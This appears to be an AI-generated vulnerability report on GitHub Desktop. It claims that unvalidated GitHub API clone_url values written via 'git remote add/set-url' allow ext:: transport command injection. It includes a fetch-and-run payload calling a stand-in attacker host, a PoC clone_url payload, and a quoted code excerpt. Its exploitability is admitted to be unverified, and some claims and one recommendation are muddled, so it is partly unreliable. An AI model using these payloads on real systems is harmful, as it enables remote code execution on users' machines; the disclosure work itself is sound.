Based on my research, the strongest analog I found is a **missing validation of API-supplied clone URLs before they are persisted as git remote configuration**, which contrasts sharply with the deliberate hardening already present in the clone path.

### Title
Unvalidated GitHub API `clone_url` written to `git remote add`/`set-url` enables transport-helper argument injection - (File: app/src/lib/git/remote.ts)

### Summary
`addRemote` and `setRemoteURL` in `app/src/lib/git/remote.ts` pass the caller-supplied `url` argument straight into `git remote add <name> <url>` / `git remote set-url <name> <url>` with no format validation and, critically, without the `--` positional-argument separator that `app/src/lib/git/clone.ts` deliberately uses. [1](#0-0) [2](#0-1) [3](#0-2) 

These functions are fed values taken directly from the GitHub API response's `clone_url` field, which is attacker-influenced whenever the API/GHE server or a repository's reported "parent" (fork source) is attacker-controlled:
- `GitStore.addUpstreamRemoteIfNeeded()` unwraps `parent.cloneURL` (populated from `gitHubRepository.clone_url` at ingestion time, see `_upsertGitHubRepository`) and passes it directly to `addRemote` with no scheme check. [4](#0-3) [5](#0-4) 
- `updateRemoteUrl()` takes `apiRepo.clone_url` and calls `gitStore.setRemoteURL(...)` after only checking that the URL *protocol* matches the existing remote's protocol — it does not check for a leading `-` or a non-`http(s)`/`ssh` scheme such as `ext::`. [6](#0-5) 

### Finding Description
The broken invariant is: *"any value stored as `remote.<name>.url` must be a well-formed transport URL that git can safely treat as a value, not as an option or an arbitrary-command transport helper."* This invariant is enforced for `git clone` (via the `--` separator in `clone.ts`, line 123), but is not enforced for `git remote add` / `git remote set-url`, nor is the API-sourced `clone_url` validated at the model layer — `GitHubRepository`'s constructor and the `IAPIRepository`/`IAPIFullRepository` deserialization path accept `clone_url` unchanged. [7](#0-6) 

Because git supports the `ext::` transport helper, a `clone_url` value such as `ext::sh -c "curl http://attacker/x|sh"` written into `.git/config` via `addRemote`/`setRemoteURL` will, on a subsequent fetch/pull of that remote (which Desktop performs automatically for background refresh, ahead/behind calculations, and the "fetch origin" button), cause git to spawn the attacker's command with the user's OS privileges.

### Impact Explanation
If the attacker controls the reported `clone_url` for a repository's "parent" (fork source) — reachable, for example, via a malicious/compromised GitHub Enterprise server, a MITM'd API response, or any repository metadata path that flows through `_upsertGitHubRepository`/`toGitHubRepository` — Desktop will silently write an attacker-chosen string into the user's local git config as `remote.upstream.url` (or overwrite `origin`'s url via `updateRemoteUrl`). The next automatic or user-initiated fetch/pull against that remote executes arbitrary shell commands, which is full code execution outside any sandbox and a direct violation of the "no code execution from an attacker-controlled API object" invariant.

### Likelihood Explanation
Exploitation requires no local access, no admin rights, and no pre-existing malware — only that the user has added/opened a repository whose GitHub API metadata (in particular the "parent" fork relationship or repository's own `clone_url`) is attacker-influenced, which matches this task's valid-impact criteria (attacker controls a GitHub API object / fetched repository metadata). The `addUpstreamRemoteIfNeeded` path runs automatically for any repository detected as a fork, without user confirmation of the resulting remote URL. The main caveat (uncertainty) is that modern git's `protocol.ext.allow` defaults to `user`, which is intended to permit `ext::` URLs only when they originate from something the *user* explicitly configured — Desktop's automatic `addRemote` call arguably qualifies as "user-configured" from git's perspective since it's a normal `git remote add` invocation, but the exact bundled git/dugite version's policy enforcement was not verified in this pass and should be confirmed by exercising the PoC against the shipped git binary.

### Recommendation
- Validate `clone_url`/any remote URL sourced from the GitHub API against an allow-list of schemes (`https:`, `http:`, `ssh:`, `git:`) before it is stored via `GitHubRepository`'s constructor or passed to `addRemote`/`setRemoteURL`, rejecting `ext::`, `fd::`, or any URL beginning with `-`.
- Add the same `'--'` positional-argument separator used in `clone.ts` to `addRemote` and `setRemoteURL` in `app/src/lib/git/remote.ts` (i.e., `git(['remote', 'add', name, '--', url], ...)` is not directly supported by git's own `remote add` syntax, so the fix must be an explicit `url` format validation performed before calling `git`).
- Apply the same validation in `updateRemoteUrl()` before calling `gitStore.setRemoteURL`.

### Proof of Concept
1. Set up (or MITM) a GitHub Enterprise-style API endpoint whose repository response for a fork reports `"parent": { "clone_url": "ext::sh -c \"touch /tmp/pwned\"", ... }`.
2. User adds/clones the fork in GitHub Desktop; `_upsertGitHubRepository` persists this value as `GitHubRepository.parent.cloneURL` with no validation. [8](#0-7) 
3. On next load, `GitStore.addUpstreamRemoteIfNeeded()` calls `addRemote(this.repository, 'upstream', url)` with the malicious value, writing it into `.git/config`. [4](#0-3) 
4. Any subsequent fetch/pull of the `upstream` remote (automatic background fetch or user click) invokes the `ext::` transport helper, executing `sh -c "touch /tmp/pwned"` (or an arbitrary payload) with the user's privileges.

  private async _upsertGitHubRepository(
    endpoint: string,
    gitHubRepository: IAPIRepository | IAPIFullRepository,
    ignoreParent = false
  ): Promise<GitHubRepository> {
    const parent =
      'parent' in gitHubRepository && gitHubRepository.parent !== undefined
        ? await this._upsertGitHubRepository(
            endpoint,
            gitHubRepository.parent,
            true
          )
        : await Promise.resolve(null) // Dexie gets confused if we return null

    const { login, type } = gitHubRepository.owner
    const owner = await this.putOwner(endpoint, login, type)

    const existingRepo = await this.db.gitHubRepositories
      .where('[ownerID+name]')
      .equals([owner.id, gitHubRepository.name])
      .first()

    // If we can't resolve permissions for the current repository chances are
    // that it's because it's the parent repository of another repository and we
    // ended up here because the "actual" repository is trying to upsert its
    // parent. Since parent repository hashes don't include a permissions hash
    // and since it's possible that the user has both the fork and the parent
    // repositories in the app we don't want to overwrite the permissions hash
    // in the parent repository if we can help it or else we'll end up in a
    // perpetual race condition where updating the fork will clear the
    // permissions on the parent and updating the parent will reinstate them.
    const permissions =
      getPermissionsString(gitHubRepository) ??
      existingRepo?.permissions ??
      undefined

    // If we're told to ignore the parent then we'll attempt to use the existing
    // parent and if that fails set it to null. This happens when we want to
    // ensure we have a GitHubRepository record but we acquired the API data for
    // said repository from an API endpoint that doesn't include the parent
    // property like when loading pull requests. Similarly even when retrieving
    // a full API repository its parent won't be a full repo so we'll never know
    // if the parent of a repository has a parent (confusing, right?)
    //
    // We do all this to ensure that we only set the parent to null when we know
    // that it needs to be cleared. Otherwise we could have a scenario where
    // we've got a repository network where C is a fork of B and B is a fork of
    // A which is the root. If we attempt to upsert C without these checks in
    // place we'd wipe our knowledge of B being a fork of A.
    //
    // Since going from having a parent to not having a parent is incredibly
    // rare (deleting a forked repository and creating it from scratch again
    // with the same name or the parent getting deleted, etc) we assume that the
    // value we've got is valid until we're certain its not.
    const parentID = ignoreParent
      ? existingRepo?.parentID ?? null
      : parent?.dbID ?? null

    const updatedGitHubRepo: IDatabaseGitHubRepository = {
      ...(existingRepo?.id !== undefined && { id: existingRepo.id }),
      ownerID: owner.id,
      name: gitHubRepository.name,
      private: gitHubRepository.private,
      htmlURL: gitHubRepository.html_url,
      cloneURL: gitHubRepository.clone_url,
      parentID,
      lastPruneDate: existingRepo?.lastPruneDate ?? null,
      issuesEnabled: gitHubRepository.has_issues,
      isArchived: gitHubRepository.archived,
      permissions,
    }
